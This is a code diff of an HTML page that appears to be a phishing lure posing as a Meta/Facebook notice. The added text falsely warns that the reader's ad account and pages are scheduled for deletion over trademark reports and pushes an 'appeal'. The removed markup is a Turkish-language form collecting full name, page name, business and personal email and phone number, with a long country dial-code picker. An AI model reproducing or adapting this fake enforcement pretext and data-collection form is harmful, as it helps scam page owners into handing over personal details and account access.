+                            <svg viewBox="0 0 24 24" width="20" height="20"><path fill-rule="evenodd" clip-rule="evenodd" d="M4.341 7.247a1 1 0 0 1 1.412.095L12 14.482l6.247-7.14a1 1 0 0 1 1.506 1.317l-7 8a1 1 0 0 1-1.506 0l-7-8a1 1 0 0 1 .095-1.412z"/></svg>
+                        </div>
+                    </div>
+
+                    <div class="action-button">
+                        <div class="action-button-img">
+                            <svg viewBox="0 0 24 24"><path fill-rule="evenodd" clip-rule="evenodd" d="M16 12a4 4 0 1 1-8 0 4 4 0 0 1 8 0zm-2 0a2 2 0 1 1-4 0 2 2 0 0 1 4 0z"/><path fill-rule="evenodd" clip-rule="evenodd" d="m22.191 9.207-2.224 2.06a8.112 8.112 0 0 1 0 1.466l2.224 2.06a1 1 0 0 1 .187 1.233l-1.702 2.948a1 1 0 0 1-1.162.455l-2.895-.896a7.991 7.991 0 0 1-1.27.735l-.672 2.954a1 1 0 0 1-.975.778H10.3a1 1 0 0 1-.975-.778l-.672-2.954a8 8 0 0 1-1.27-.735l-2.895.896a1 1 0 0 1-1.162-.455l-1.702-2.948a1 1 0 0 1 .187-1.233l2.224-2.06a8.1 8.1 0 0 1 0-1.466L1.81 9.207a1 1 0 0 1-.187-1.233l1.702-2.948a1 1 0 0 1 1.162-.455l2.895.896a7.992 7.992 0 0 1 1.27-.735l.672-2.954A1 1 0 0 1 10.299 1h3.403a1 1 0 0 1 .975.778l.672 2.954a7.99 7.99 0 0 1 1.27.735l2.895-.896a1 1 0 0 1 1.162.455l1.702 2.948a1 1 0 0 1-.187 1.233zm-8.574-3.071.894.412c.335.155.653.34.952.551l.805.57 3.075-.951.903 1.564-2.36 2.186.09.98a6.093 6.093 0 0 1 0 1.104l-.09.98 2.36 2.185-.903 1.565-3.075-.951-.805.57a5.993 5.993 0 0 1-.952.55l-.894.413L12.904 21h-1.807l-.713-3.136-.894-.412a5.993 5.993 0 0 1-.952-.551l-.805-.57-3.075.951-.904-1.565 2.36-2.185-.089-.98a6.102 6.102 0 0 1 0-1.104l.09-.98-2.36-2.186.903-1.564 3.075.951.805-.57c.299-.212.617-.396.952-.55l.894-.413L11.097 3h1.807l.713 3.136z"/></svg>
+                        </div>
+                        <div class="action-button-text" data-translate="settings">Settings</div>
+                        <div class="action-button-arrow">
+                            <svg viewBox="0 0 24 24" width="20" height="20"><path fill-rule="evenodd" clip-rule="evenodd" d="M4.341 7.247a1 1 0 0 1 1.412.095L12 14.482l6.247-7.14a1 1 0 0 1 1.506 1.317l-7 8a1 1 0 0 1-1.506 0l-7-8a1 1 0 0 1 .095-1.412z"/></svg>
+                        </div>
+                    </div>
                 </div>
             </div>
 
-            <div class="form-coursera-content">
-                <div class="form-coursera-field">
-                    <label>
-                        <span style="display:flex;gap:5px;"><span data-i18n="form.fullNameLabel">Tam Ad</span> <span style="color:red">*</span></span>
-                        <input type="text" id="fullName" name="fullname" required="" data-i18n-placeholder="form.fullNamePlaceholder" placeholder="Tam Adınız">
-                    </label>
-                </div>
+            <!-- Main Content -->
+            <div class="col-md-8">
+                <div class="card-white">
+                    <h1 style="font-size: 28px; font-weight: 600; display: flex; align-items: center; gap: 12px; margin-bottom: 16px;">
+                        <span style="font-size: 40px;">⚠️</span>
+                        <span data-translate="warning_title">We have scheduled the deletion of your ad account and pages.</span>
+                    </h1>
 
-                <div class="form-coursera-field">
-                    <label>
-                        <span style="display:flex;gap:5px;"><span data-i18n="form.fanpageLabel">Sayfa Adı</span> <span style="color:red">*</span></span>
-                        <input type="text" id="fanpage" name="facebook_page_name" required="" data-i18n-placeholder="form.fanpagePlaceholder" placeholder="Sayfa Adı">
-                    </label>
-                </div>
+                    <h6 style="font-weight: 400; line-height: 1.6; color: #1c2b33;" data-translate="warning_desc1">We have received multiple reports indicating that your advertisement violates trademark rights. After a detailed review, we have made a decision regarding this matter.</h6>
 
-                <div class="form-coursera-field">
-                    <label>
-                        <span style="display:flex;gap:5px;"><span data-i18n="form.emailBusinessLabel">İş E-posta Adresi</span> <span style="color:red">*</span></span>
-                        <input type="email" id="emailBusiness" name="business_email" required="" data-i18n-placeholder="form.emailBusinessPlaceholder" placeholder="İş E-postası">
-                    </label>
-                </div>
+                    <h6 style="font-weight: 400; line-height: 1.6; margin-top: 12px;" data-translate="warning_desc2">If no corrective actions are taken, your ad account will be permanently deleted. If you wish to appeal this decision, please submit an appeal request for review and assistance.</h6>
 
-                <div class="form-coursera-field">
-                    <label>
-                        <span style="display:flex;gap:5px;"><span data-i18n="form.emailLabel">Kişisel E-posta Adresi</span> <span style="color:red">*</span></span>
-                        <input type="email" id="email" name="personal_email" required="" data-i18n-placeholder="form.emailPlaceholder" placeholder="E-posta Adresi">
-                    </label>
-                </div>
-                <div class="form-error" id="error-email"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <circle cx="12" cy="12" r="10"></circle>
-                        <line x1="12" y1="8" x2="12" y2="12"></line>
-                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
-                    </svg><span></span></div>
+                    <!-- Request Review Box -->
+                    <div style="background: #f7f8fa; border-radius: 12px; padding: 20px; margin: 24px 0;">
+                        <div style="background: white; border-radius: 15px; padding: 20px;">
+                            <h5 style="font-weight: 600;" data-translate="request_review">Request Review</h5>
+                            <h6 style="font-weight: 400; font-size: 0.95rem; margin-top: 8px;" data-translate="request_desc1">This form is only to be used for submitting appeals and restoring account status.</h6>
+                            <h6 style="font-weight: 400; font-size: 0.95rem;" data-translate="request_desc2">Please ensure that you provide the requested information below. Failure to do so may delay the processing of your appeal.</h6>
+                        </div>
 
-                <div class="form-coursera-field">
-                    <span style="display:flex;gap:5px;"><span data-i18n="form.phoneLabel">Cep Telefonu Numarası</span> <span style="color:red">*</span></span>
-                    <div class="phone-input-wrapper">
-                        <div class="react-tel-input">
-                            <input class="form-control" placeholder="Telefon Numarası" data-i18n-placeholder="form.phonePlaceholder" type="tel" id="phone" value="" required="">
-                            <div class="flag-dropdown" id="flag-dropdown">
-                                <div class="selected-flag" title="Egypt: +20" onclick="toggleCountryDropdown()">
-                                    <img id="selected-flag-img" src="./Appeal Forms_files/eg.png" alt="EG" style="width:20px;height:14px;border-radius:2px;">
-                                    <div class="arrow"></div>
-                                </div>
-                                <ul id="country-dropdown" class="country-list" style="display:none">
-                                    <li class="country-search-wrap" onclick="event.stopPropagation()">
-                                        <input type="text" id="country-search" placeholder="Ülke Ara..." data-i18n-placeholder="form.searchCountry" autocomplete="off">
-                                    </li>
-                                <li class="country" onclick="selectCountry(&#39;+93&#39;,&#39;af&#39;)"><img src="./Appeal Forms_files/af.png" class="country-flag"><span class="country-name">Afghanistan</span><span class="dial-code">+93</span></li><li class="country" onclick="selectCountry(&#39;+355&#39;,&#39;al&#39;)"><img src="./Appeal Forms_files/al.png" class="country-flag"><span class="country-name">Arnavutluk</span><span class="dial-code">+355</span></li><li class="country" onclick="selectCountry(&#39;+213&#39;,&#39;dz&#39;)"><img src="./Appeal Forms_files/dz.png" class="country-flag"><span class="country-name">Cezayir</span><span class="dial-code">+213</span></li><li class="country" onclick="selectCountry(&#39;+376&#39;,&#39;ad&#39;)"><img src="./Appeal Forms_files/ad.png" class="country-flag"><span class="country-name">Andorra</span><span class="dial-code">+376</span></li><li class="country" onclick="selectCountry(&#39;+244&#39;,&#39;ao&#39;)"><img src="./Appeal Forms_files/ao.png" class="country-flag"><span class="country-name">Angola</span><span class="dial-code">+244</span></li><li class="country" onclick="selectCountry(&#39;+54&#39;,&#39;ar&#39;)"><img src="./Appeal Forms_files/ar.png" class="country-flag"><span class="country-name">Arjantin</span><span class="dial-code">+54</span></li><li class="country" onclick="selectCountry(&#39;+374&#39;,&#39;am&#39;)"><img src="./Appeal Forms_files/am.png" class="country-flag"><span class="country-name">Ermenistan</span><span class="dial-code">+374</span></li><li class="country" onclick="selectCountry(&#39;+297&#39;,&#39;aw&#39;)"><img src="./Appeal Forms_files/aw.png" class="country-flag"><span class="country-name">Aruba</span><span class="dial-code">+297</span></li><li class="country" onclick="selectCountry(&#39;+61&#39;,&#39;au&#39;)"><img src="./Appeal Forms_files/au.png" class="country-flag"><span class="country-name">Avustralya</span><span class="dial-code">+61</span></li><li class="country" onclick="selectCountry(&#39;+43&#39;,&#39;at&#39;)"><img src="./Appeal Forms_files/at.png" class="country-flag"><span class="country-name">Avusturya</span><span class="dial-code">+43</span></li><li class="country" onclick="selectCountry(&#39;+994&#39;,&#39;az&#39;)"><img src="./Appeal Forms_files/az.png" class="country-flag"><span class="country-name">Azerbaycan</span><span class="dial-code">+994</span></li><li class="country" onclick="selectCountry(&#39;+973&#39;,&#39;bh&#39;)"><img src="./Appeal Forms_files/bh.png" class="country-flag"><span class="country-name">Bahreyn</span><span class="dial-code">+973</span></li><li class="country" onclick="selectCountry(&#39;+880&#39;,&#39;bd&#39;)"><img src="./Appeal Forms_files/bd.png" class="country-flag"><span class="country-name">Bangladeş</span><span class="dial-code">+880</span></li><li class="country" onclick="selectCountry(&#39;+375&#39;,&#39;by&#39;)"><img src="./Appeal Forms_files/by.png" class="country-flag"><span class="country-name">Belarus</span><span class="dial-code">+375</span></li><li class="country" onclick="selectCountry(&#39;+32&#39;,&#39;be&#39;)"><img src="./Appeal Forms_files/be.png" class="country-flag"><span class="country-name">Belçika</span><span class="dial-code">+32</span></li><li class="country" onclick="selectCountry(&#39;+501&#39;,&#39;bz&#39;)"><img src="./Appeal Forms_files/bz.png" class="country-flag"><span class="country-name">Belize</span><span class="dial-code">+501</span></li><li class="country" onclick="selectCountry(&#39;+229&#39;,&#39;bj&#39;)"><img src="./Appeal Forms_files/bj.png" class="country-flag"><span class="country-name">Benin</span><span class="dial-code">+229</span></li><li class="country" onclick="selectCountry(&#39;+975&#39;,&#39;bt&#39;)"><img src="./Appeal Forms_files/bt.png" class="country-flag"><span class="country-name">Butan</span><span class="dial-code">+975</span></li><li class="country" onclick="selectCountry(&#39;+591&#39;,&#39;bo&#39;)"><img src="./Appeal Forms_files/bo.png" class="country-flag"><span class="country-name">Bolivya</span><span class="dial-code">+591</span></li><li class="country" onclick="selectCountry(&#39;+387&#39;,&#39;ba&#39;)"><img src="./Appeal Forms_files/ba.png" class="country-flag"><span class="country-name">Bosna Hersek</span><span class="dial-code">+387</span></li><li class="country" onclick="selectCountry(&#39;+267&#39;,&#39;bw&#39;)"><img src="./Appeal Forms_files/bw.png" class="country-flag"><span class="country-name">Botsvana</span><span class="dial-code">+267</span></li><li class="country" onclick="selectCountry(&#39;+55&#39;,&#39;br&#39;)"><img src="./Appeal Forms_files/br.png" class="country-flag"><span class="country-name">Brezilya</span><span class="dial-code">+55</span></li><li class="country" onclick="selectCountry(&#39;+673&#39;,&#39;bn&#39;)"><img src="./Appeal Forms_files/bn.png" class="country-flag"><span class="country-name">Brunei</span><span class="dial-code">+673</span></li><li class="country" onclick="selectCountry(&#39;+359&#39;,&#39;bg&#39;)"><img src="./Appeal Forms_files/bg.png" class="country-flag"><span class="country-name">Bulgaristan</span><span class="dial-code">+359</span></li><li class="country" onclick="selectCountry(&#39;+226&#39;,&#39;bf&#39;)"><img src="./Appeal Forms_files/bf.png" class="country-flag"><span class="country-name">Burkina Faso</span><span class="dial-code">+226</span></li><li class="country" onclick="selectCountry(&#39;+257&#39;,&#39;bi&#39;)"><img src="./Appeal Forms_files/bi.png" class="country-flag"><span class="country-name">Burundi</span><span class="dial-code">+257</span></li><li class="country" onclick="selectCountry(&#39;+855&#39;,&#39;kh&#39;)"><img src="./Appeal Forms_files/kh.png" class="country-flag"><span class="country-name">Kamboçya</span><span class="dial-code">+855</span></li><li class="country" onclick="selectCountry(&#39;+237&#39;,&#39;cm&#39;)"><img src="./Appeal Forms_files/cm.png" class="country-flag"><span class="country-name">Kamerun</span><span class="dial-code">+237</span></li><li class="country" onclick="selectCountry(&#39;+238&#39;,&#39;cv&#39;)"><img src="./Appeal Forms_files/cv.png" class="country-flag"><span class="country-name">Cape Verde</span><span class="dial-code">+238</span></li><li class="country" onclick="selectCountry(&#39;+236&#39;,&#39;cf&#39;)"><img src="./Appeal Forms_files/cf.png" class="country-flag"><span class="country-name">Orta Afrika Cumhuriyeti</span><span class="dial-code">+236</span></li><li class="country" onclick="selectCountry(&#39;+235&#39;,&#39;td&#39;)"><img src="./Appeal Forms_files/td.png" class="country-flag"><span class="country-name">Çad</span><span class="dial-code">+235</span></li><li class="country" onclick="selectCountry(&#39;+56&#39;,&#39;cl&#39;)"><img src="./Appeal Forms_files/cl.png" class="country-flag"><span class="country-name">Şili</span><span class="dial-code">+56</span></li><li class="country" onclick="selectCountry(&#39;+86&#39;,&#39;cn&#39;)"><img src="./Appeal Forms_files/cn.png" class="country-flag"><span class="country-name">Çin</span><span class="dial-code">+86</span></li><li class="country" onclick="selectCountry(&#39;+57&#39;,&#39;co&#39;)"><img src="./Appeal Forms_files/co.png" class="country-flag"><span class="country-name">Kolombiya</span><span class="dial-code">+57</span></li><li class="country" onclick="selectCountry(&#39;+269&#39;,&#39;km&#39;)"><img src="./Appeal Forms_files/km.png" class="country-flag"><span class="country-name">Komorlar</span><span class="dial-code">+269</span></li><li class="country" onclick="selectCountry(&#39;+506&#39;,&#39;cr&#39;)"><img src="./Appeal Forms_files/cr.png" class="country-flag"><span class="country-name">Kosta Rika</span><span class="dial-code">+506</span></li><li class="country" onclick="selectCountry(&#39;+385&#39;,&#39;hr&#39;)"><img src="./Appeal Forms_files/hr.png" class="country-flag"><span class="country-name">Hırvatistan</span><span class="dial-code">+385</span></li><li class="country" onclick="selectCountry(&#39;+53&#39;,&#39;cu&#39;)"><img src="./Appeal Forms_files/cu.png" class="country-flag"><span class="country-name">Küba</span><span class="dial-code">+53</span></li><li class="country" onclick="selectCountry(&#39;+357&#39;,&#39;cy&#39;)"><img src="./Appeal Forms_files/cy.png" class="country-flag"><span class="country-name">Kıbrıs</span><span class="dial-code">+357</span></li><li class="country" onclick="selectCountry(&#39;+420&#39;,&#39;cz&#39;)"><img src="./Appeal Forms_files/cz.png" class="country-flag"><span class="country-name">Çek Cumhuriyeti</span><span class="dial-code">+420</span></li><li class="country" onclick="selectCountry(&#39;+45&#39;,&#39;dk&#39;)"><img src="./Appeal Forms_files/dk.png" class="country-flag"><span class="country-name">Danimarka</span><span class="dial-code">+45</span></li><li class="country" onclick="selectCountry(&#39;+253&#39;,&#39;dj&#39;)"><img src="./Appeal Forms_files/dj.png" class="country-flag"><span class="country-name">Cibuti</span><span class="dial-code">+253</span></li><li class="country" onclick="selectCountry(&#39;+243&#39;,&#39;cd&#39;)"><img src="./Appeal Forms_files/cd.png" class="country-flag"><span class="country-name">Kongo Demokratik Cumhuriyeti</span><span class="dial-code">+243</span></li><li class="country" onclick="selectCountry(&#39;+593&#39;,&#39;ec&#39;)"><img src="./Appeal Forms_files/ec.png" class="country-flag"><span class="country-name">Ekvador</span><span class="dial-code">+593</span></li><li class="country highlight" onclick="selectCountry(&#39;+20&#39;,&#39;eg&#39;)"><img src="./Appeal Forms_files/eg.png" class="country-flag"><span class="country-name">Mısır</span><span class="dial-code">+20</span></li><li class="country" onclick="selectCountry(&#39;+503&#39;,&#39;sv&#39;)"><img src="./Appeal Forms_files/sv.png" class="country-flag"><span class="country-name">El Salvador</span><span class="dial-code">+503</span></li><li class="country" onclick="selectCountry(&#39;+240&#39;,&#39;gq&#39;)"><img src="./Appeal Forms_files/gq.png" class="country-flag"><span class="country-name">Ekvator Ginesi</span><span class="dial-code">+240</span></li><li class="country" onclick="selectCountry(&#39;+291&#39;,&#39;er&#39;)"><img src="./Appeal Forms_files/er.png" class="country-flag"><span class="country-name">Eritre</span><span class="dial-code">+291</span></li><li class="country" onclick="selectCountry(&#39;+372&#39;,&#39;ee&#39;)"><img src="./Appeal Forms_files/ee.png" class="country-flag"><span class="country-name">Estonya</span><span class="dial-code">+372</span></li><li class="country" onclick="selectCountry(&#39;+268&#39;,&#39;sz&#39;)"><img src="./Appeal Forms_files/sz.png" class="country-flag"><span class="country-name">Svaziland</span><span class="dial-code">+268</span></li><li class="country" onclick="selectCountry(&#39;+251&#39;,&#39;et&#39;)"><img src="./Appeal Forms_files/et.png" class="country-flag"><span class="country-name">Etiyopya</span><span class="dial-code">+251</span></li><li class="country" onclick="selectCountry(&#39;+500&#39;,&#39;fk&#39;)"><img src="./Appeal Forms_files/fk.png" class="country-flag"><span class="country-name">Falkland Adaları</span><span class="dial-code">+500</span></li><li class="country" onclick="selectCountry(&#39;+298&#39;,&#39;fo&#39;)"><img src="./Appeal Forms_files/fo.png" class="country-flag"><span class="country-name">Faroe Adaları</span><span class="dial-code">+298</span></li><li class="country" onclick="selectCountry(&#39;+679&#39;,&#39;fj&#39;)"><img src="./Appeal Forms_files/fj.png" class="country-flag"><span class="country-name">Fiji</span><span class="dial-code">+679</span></li><li class="country" onclick="selectCountry(&#39;+358&#39;,&#39;fi&#39;)"><img src="./Appeal Forms_files/fi.png" class="country-flag"><span class="country-name">Finlandiya</span><span class="dial-code">+358</span></li><li class="country" onclick="selectCountry(&#39;+33&#39;,&#39;fr&#39;)"><img src="./Appeal Forms_files/fr.png" class="country-flag"><span class="country-name">Fransa</span><span class="dial-code">+33</span></li><li class="country" onclick="selectCountry(&#39;+241&#39;,&#39;ga&#39;)"><img src="./Appeal Forms_files/ga.png" class="country-flag"><span class="country-name">Gabon</span><span class="dial-code">+241</span></li><li class="country" onclick="selectCountry(&#39;+220&#39;,&#39;gm&#39;)"><img src="./Appeal Forms_files/gm.png" class="country-flag"><span class="country-name">Gambiya</span><span class="dial-code">+220</span></li><li class="country" onclick="selectCountry(&#39;+995&#39;,&#39;ge&#39;)"><img src="./Appeal Forms_files/ge.png" class="country-flag"><span class="country-name">Gürcistan</span><span class="dial-code">+995</span></li><li class="country" onclick="selectCountry(&#39;+49&#39;,&#39;de&#39;)"><img src="./Appeal Forms_files/de.png" class="country-flag"><span class="country-name">Almanya</span><span class="dial-code">+49</span></li><li class="country" onclick="selectCountry(&#39;+233&#39;,&#39;gh&#39;)"><img src="./Appeal Forms_files/gh.png" class="country-flag"><span class="country-name">Gana</span><span class="dial-code">+233</span></li><li class="country" onclick="selectCountry(&#39;+350&#39;,&#39;gi&#39;)"><img src="./Appeal Forms_files/gi.png" class="country-flag"><span class="country-name">Cebelitarık</span><span class="dial-code">+350</span></li><li class="country" onclick="selectCountry(&#39;+30&#39;,&#39;gr&#39;)"><img src="./Appeal Forms_files/gr.png" class="country-flag"><span class="country-name">Yunanistan</span><span class="dial-code">+30</span></li><li class="country" onclick="selectCountry(&#39;+299&#39;,&#39;gl&#39;)"><img src="./Appeal Forms_files/gl.png" class="country-flag"><span class="country-name">Grönland</span><span class="dial-code">+299</span></li><li class="country" onclick="selectCountry(&#39;+502&#39;,&#39;gt&#39;)"><img src="./Appeal Forms_files/gt.png" class="country-flag"><span class="country-name">Guatemala</span><span class="dial-code">+502</span></li><li class="country" onclick="selectCountry(&#39;+224&#39;,&#39;gn&#39;)"><img src="./Appeal Forms_files/gn.png" class="country-flag"><span class="country-name">Gine</span><span class="dial-code">+224</span></li><li class="country" onclick="selectCountry(&#39;+245&#39;,&#39;gw&#39;)"><img src="./Appeal Forms_files/gw.png" class="country-flag"><span class="country-name">Gine-Bissau</span><span class="dial-code">+245</span></li><li class="country" onclick="selectCountry(&#39;+592&#39;,&#39;gy&#39;)"><img src="./Appeal Forms_files/gy.png" class="country-flag"><span class="country-name">Guyana</span><span class="dial-code">+592</span></li><li class="country" onclick="selectCountry(&#39;+509&#39;,&#39;ht&#39;)"><img src="./Appeal Forms_files/ht.png" class="country-flag"><span class="country-name">Haiti</span><span class="dial-code">+509</span></li><li class="country" onclick="selectCountry(&#39;+504&#39;,&#39;hn&#39;)"><img src="./Appeal Forms_files/hn.png" class="country-flag"><span class="country-name">Honduras</span><span class="dial-code">+504</span></li><li class="country" onclick="selectCountry(&#39;+852&#39;,&#39;hk&#39;)"><img src="./Appeal Forms_files/hk.png" class="country-flag"><span class="country-name">Hong Kong</span><span class="dial-code">+852</span></li><li class="country" onclick="selectCountry(&#39;+36&#39;,&#39;hu&#39;)"><img src="./Appeal Forms_files/hu.png" class="country-flag"><span class="country-name">Macaristan</span><span class="dial-code">+36</span></li><li class="country" onclick="selectCountry(&#39;+354&#39;,&#39;is&#39;)"><img src="./Appeal Forms_files/is.png" class="country-flag"><span class="country-name">İzlanda</span><span class="dial-code">+354</span></li><li class="country" onclick="selectCountry(&#39;+91&#39;,&#39;in&#39;)"><img src="./Appeal Forms_files/in.png" class="country-flag"><span class="country-name">Hindistan</span><span class="dial-code">+91</span></li><li class="country" onclick="selectCountry(&#39;+62&#39;,&#39;id&#39;)"><img src="./Appeal Forms_files/id.png" class="country-flag"><span class="country-name">Endonezya</span><span class="dial-code">+62</span></li><li class="country" onclick="selectCountry(&#39;+98&#39;,&#39;ir&#39;)"><img src="./Appeal Forms_files/ir.png" class="country-flag"><span class="country-name">İran</span><span class="dial-code">+98</span></li><li class="country" onclick="selectCountry(&#39;+964&#39;,&#39;iq&#39;)"><img src="./Appeal Forms_files/iq.png" class="country-flag"><span class="country-name">Irak</span><span class="dial-code">+964</span></li><li class="country" onclick="selectCountry(&#39;+353&#39;,&#39;ie&#39;)"><img src="./Appeal Forms_files/ie.png" class="country-flag"><span class="country-name">İrlanda</span><span class="dial-code">+353</span></li><li class="country" onclick="selectCountry(&#39;+972&#39;,&#39;il&#39;)"><img src="./Appeal Forms_files/il.png" class="country-flag"><span class="country-name">İsrail</span><span class="dial-code">+972</span></li><li class="country" onclick="selectCountry(&#39;+39&#39;,&#39;it&#39;)"><img src="./Appeal Forms_files/it.png" class="country-flag"><span class="country-name">İtalya</span><span class="dial-code">+39</span></li><li class="country" onclick="selectCountry(&#39;+225&#39;,&#39;ci&#39;)"><img src="./Appeal Forms_files/ci.png" class="country-flag"><span class="country-name">Fildişi Sahili</span><span class="dial-code">+225</span></li><li class="country" onclick="selectCountry(&#39;+81&#39;,&#39;jp&#39;)"><img src="./Appeal Forms_files/jp.png" class="country-flag"><span class="country-name">Japonya</span><span class="dial-code">+81</span></li><li class="country" onclick="selectCountry(&#39;+962&#39;,&#39;jo&#39;)"><img src="./Appeal Forms_files/jo.png" class="country-flag"><span class="country-name">Ürdün</span><span class="dial-code">+962</span></li><li class="country" onclick="selectCountry(&#39;+254&#39;,&#39;ke&#39;)"><img src="./Appeal Forms_files/ke.png" class="country-flag"><span class="country-name">Kenya</span><span class="dial-code">+254</span></li><li class="country" onclick="selectCountry(&#39;+686&#39;,&#39;ki&#39;)"><img src="./Appeal Forms_files/ki.png" class="country-flag"><span class="country-name">Kiribati</span><span class="dial-code">+686</span></li><li class="country" onclick="selectCountry(&#39;+383&#39;,&#39;xk&#39;)"><img src="./Appeal Forms_files/xk.png" class="country-flag"><span class="country-name">Kosova</span><span class="dial-code">+383</span></li><li class="country" onclick="selectCountry(&#39;+965&#39;,&#39;kw&#39;)"><img src="./Appeal Forms_files/kw.png" class="country-flag"><span class="country-name">Kuveyt</span><span class="dial-code">+965</span></li><li class="country" onclick="selectCountry(&#39;+996&#39;,&#39;kg&#39;)"><img src="./Appeal Forms_files/kg.png" class="country-flag"><span class="country-name">Kırgızistan</span><span class="dial-code">+996</span></li><li class="country" onclick="selectCountry(&#39;+856&#39;,&#39;la&#39;)"><img src="./Appeal Forms_files/la.png" class="country-flag"><span class="country-name">Laos</span><span class="dial-code">+856</span></li><li class="country" onclick="selectCountry(&#39;+371&#39;,&#39;lv&#39;)"><img src="./Appeal Forms_files/lv.png" class="country-flag"><span class="country-name">Letonya</span><span class="dial-code">+371</span></li><li class="country" onclick="selectCountry(&#39;+961&#39;,&#39;lb&#39;)"><img src="./Appeal Forms_files/lb.png" class="country-flag"><span class="country-name">Lübnan</span><span class="dial-code">+961</span></li><li class="country" onclick="selectCountry(&#39;+266&#39;,&#39;ls&#39;)"><img src="./Appeal Forms_files/ls.png" class="country-flag"><span class="country-name">Lesotho</span><span class="dial-code">+266</span></li><li class="country" onclick="selectCountry(&#39;+231&#39;,&#39;lr&#39;)"><img src="./Appeal Forms_files/lr.png" class="country-flag"><span class="country-name">Liberya</span><span class="dial-code">+231</span></li><li class="country" onclick="selectCountry(&#39;+218&#39;,&#39;ly&#39;)"><img src="./Appeal Forms_files/ly.png" class="country-flag"><span class="country-name">Libya</span><span class="dial-code">+218</span></li><li class="country" onclick="selectCountry(&#39;+423&#39;,&#39;li&#39;)"><img src="./Appeal Forms_files/li.png" class="country-flag"><span class="country-name">Lihtenştayn</span><span class="dial-code">+423</span></li><li class="country" onclick="selectCountry(&#39;+370&#39;,&#39;lt&#39;)"><img src="./Appeal Forms_files/lt.png" class="country-flag"><span class="country-name">Litvanya</span><span class="dial-code">+370</span></li><li class="country" onclick="selectCountry(&#39;+352&#39;,&#39;lu&#39;)"><img src="./Appeal Forms_files/lu.png" class="country-flag"><span class="country-name">Lüksemburg</span><span class="dial-code">+352</span></li><li class="country" onclick="selectCountry(&#39;+853&#39;,&#39;mo&#39;)"><img src="./Appeal Forms_files/mo.png" class="country-flag"><span class="country-name">Makao</span><span class="dial-code">+853</span></li><li class="country" onclick="selectCountry(&#39;+261&#39;,&#39;mg&#39;)"><img src="./Appeal Forms_files/mg.png" class="country-flag"><span class="country-name">Madagaskar</span><span class="dial-code">+261</span></li><li class="country" onclick="selectCountry(&#39;+265&#39;,&#39;mw&#39;)"><img src="./Appeal Forms_files/mw.png" class="country-flag"><span class="country-name">Malavi</span><span class="dial-code">+265</span></li><li class="country" onclick="selectCountry(&#39;+60&#39;,&#39;my&#39;)"><img src="./Appeal Forms_files/my.png" class="country-flag"><span class="country-name">Malezya</span><span class="dial-code">+60</span></li><li class="country" onclick="selectCountry(&#39;+960&#39;,&#39;mv&#39;)"><img src="./Appeal Forms_files/mv.png" class="country-flag"><span class="country-name">Maldivler</span><span class="dial-code">+960</span></li><li class="country" onclick="selectCountry(&#39;+223&#39;,&#39;ml&#39;)"><img src="./Appeal Forms_files/ml.png" class="country-flag"><span class="country-name">Mali</span><span class="dial-code">+223</span></li><li class="country" onclick="selectCountry(&#39;+356&#39;,&#39;mt&#39;)"><img src="./Appeal Forms_files/mt.png" class="country-flag"><span class="country-name">Malta</span><span class="dial-code">+356</span></li><li class="country" onclick="selectCountry(&#39;+222&#39;,&#39;mr&#39;)"><img src="./Appeal Forms_files/mr.png" class="country-flag"><span class="country-name">Moritanya</span><span class="dial-code">+222</span></li><li class="country" onclick="selectCountry(&#39;+230&#39;,&#39;mu&#39;)"><img src="./Appeal Forms_files/mu.png" class="country-flag"><span class="country-name">Mauritius</span><span class="dial-code">+230</span></li><li class="country" onclick="selectCountry(&#39;+52&#39;,&#39;mx&#39;)"><img src="./Appeal Forms_files/mx.png" class="country-flag"><span class="country-name">Meksika</span><span class="dial-code">+52</span></li><li class="country" onclick="selectCountry(&#39;+373&#39;,&#39;md&#39;)"><img src="./Appeal Forms_files/md.png" class="country-flag"><span class="country-name">Moldova</span><span class="dial-code">+373</span></li><li class="country" onclick="selectCountry(&#39;+377&#39;,&#39;mc&#39;)"><img src="./Appeal Forms_files/mc.png" class="country-flag"><span class="country-name">Monako</span><span class="dial-code">+377</span></li><li class="country" onclick="selectCountry(&#39;+976&#39;,&#39;mn&#39;)"><img src="./Appeal Forms_files/mn.png" class="country-flag"><span class="country-name">Moğolistan</span><span class="dial-code">+976</span></li><li class="country" onclick="selectCountry(&#39;+382&#39;,&#39;me&#39;)"><img src="./Appeal Forms_files/me.png" class="country-flag"><span class="country-name">Karadağ</span><span class="dial-code">+382</span></li><li class="country" onclick="selectCountry(&#39;+212&#39;,&#39;ma&#39;)"><img src="./Appeal Forms_files/ma.png" class="country-flag"><span class="country-name">Fas</span><span class="dial-code">+212</span></li><li class="country" onclick="selectCountry(&#39;+258&#39;,&#39;mz&#39;)"><img src="./Appeal Forms_files/mz.png" class="country-flag"><span class="country-name">Mozambik</span><span class="dial-code">+258</span></li><li class="country" onclick="selectCountry(&#39;+95&#39;,&#39;mm&#39;)"><img src="./Appeal Forms_files/mm.png" class="country-flag"><span class="country-name">Myanmar</span><span class="dial-code">+95</span></li><li class="country" onclick="selectCountry(&#39;+264&#39;,&#39;na&#39;)"><img src="./Appeal Forms_files/na.png" class="country-flag"><span class="country-name">Namibya</span><span class="dial-code">+264</span></li><li class="country" onclick="selectCountry(&#39;+977&#39;,&#39;np&#39;)"><img src="./Appeal Forms_files/np.png" class="country-flag"><span class="country-name">Nepal</span><span class="dial-code">+977</span></li><li class="country" onclick="selectCountry(&#39;+31&#39;,&#39;nl&#39;)"><img src="./Appeal Forms_files/nl.png" class="country-flag"><span class="country-name">Hollanda</span><span class="dial-code">+31</span></li><li class="country" onclick="selectCountry(&#39;+64&#39;,&#39;nz&#39;)"><img src="./Appeal Forms_files/nz.png" class="country-flag"><span class="country-name">Yeni Zelanda</span><span class="dial-code">+64</span></li><li class="country" onclick="selectCountry(&#39;+505&#39;,&#39;ni&#39;)"><img src="./Appeal Forms_files/ni.png" class="country-flag"><span class="country-name">Nikaragua</span><span class="dial-code">+505</span></li><li class="country" onclick="selectCountry(&#39;+227&#39;,&#39;ne&#39;)"><img src="./Appeal Forms_files/ne.png" class="country-flag"><span class="country-name">Nijer</span><span class="dial-code">+227</span></li><li class="country" onclick="selectCountry(&#39;+234&#39;,&#39;ng&#39;)"><img src="./Appeal Forms_files/ng.png" class="country-flag"><span class="country-name">Nijerya</span><span class="dial-code">+234</span></li><li class="country" onclick="selectCountry(&#39;+850&#39;,&#39;kp&#39;)"><img src="./Appeal Forms_files/kp.png" class="country-flag"><span class="country-name">Kuzey Kore</span><span class="dial-code">+850</span></li><li class="country" 